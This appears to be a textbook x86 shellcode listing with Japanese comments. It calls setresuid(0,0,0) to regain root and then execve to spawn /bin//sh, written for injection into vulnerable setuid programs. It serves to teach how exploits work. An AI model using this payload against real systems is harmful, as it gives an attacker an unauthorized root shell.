BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; eaxをゼロクリアする
  xor ebx, ebx      ; ebxをゼロクリアする
  xor ecx, ecx      ; ecxをゼロクリアする
  cdq               ; eaxの符号拡張を用いてedxをゼロクリアする
  mov BYTE al, 0xa4 ; システムコール164番（0xa4）
  int 0x80          ; setresuid(0, 0, 0)  すべてのroot権限を復活させる

; execve(const char *filename, char *const argv [], char *const envp[])
  push BYTE 11      ; スタックに11をプッシュする
  pop eax           ; 11の2ワードをeaxにポップする
  push ecx          ; 文字列を終端させるためにnullバイト（複数）をプッシュする
  push 0x68732f2f   ; "//sh"をスタックにプッシュする
  push 0x6e69622f   ; "/bin"をスタックにプッシュする
  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
  push ecx          ; スタックに32ビットのnull終端をプッシュする
  mov edx, esp      ; これはenvp用の空の配列である
  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
